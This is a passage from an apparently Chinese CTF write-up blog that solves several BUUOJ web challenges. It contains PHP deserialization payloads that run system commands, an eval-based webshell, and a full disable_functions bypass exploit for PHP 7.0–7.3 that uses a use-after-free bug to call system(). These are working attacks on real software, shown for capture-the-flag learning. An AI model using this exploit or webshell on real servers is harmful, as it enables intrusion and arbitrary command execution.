class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：空字符串<span class="string">''</span></span><br><span class="line">这里的<span class="string">'strtolower("&#123;$&#123;phpinfo()&#125;&#125;")'</span>执行后相当于 strtolower(<span class="string">"&#123;<span class="variable">$&#123;1&#125;</span>&#125;"</span>) 又相当于 strtolower(<span class="string">"&#123;null&#125;"</span>) 又相当于 <span class="string">''</span> 空字符串</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>读取index.php源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php</span><br><span class="line">post:func=readfile&amp;p=index.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过了很多，发现有个类，没有被可过滤，可以利用反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"find / -name flag*"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> $test=<span class="keyword">new</span> Test();</span><br><span class="line"> <span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>寻找flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php </span><br><span class="line">post: func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:16:<span class="string">"grep -r 'flag' /"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php </span><br><span class="line">post: func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:22:<span class="string">"cat /tmp/flagoefiu4r93"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>构造一句话，用蚁剑连接 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">'eval($_POST["ye1s"]);'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>猜测需要执行/readflag文件才能得到flag，接下来上传disable functions bypass脚本突破执行命令即可，bypass脚本github有很多，自己找一下即可。<br>如绕过脚本：<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn("uname -a");</span></span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在命令执行点包含shell.php即可获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">'/tmp/shell.php'</span>);base64编码之后得到：aW5jbHVkZSgnL3RtcC9zaGVsbC5waHAnKTs=</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><p>DS_Store泄露</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ds_store_exp.py http://node3.buuoj.cn:25749/.</span><br></pre></td></tr></table></figure><p>看到有个L0g1n.php<br>访问一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure><p>修改头部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 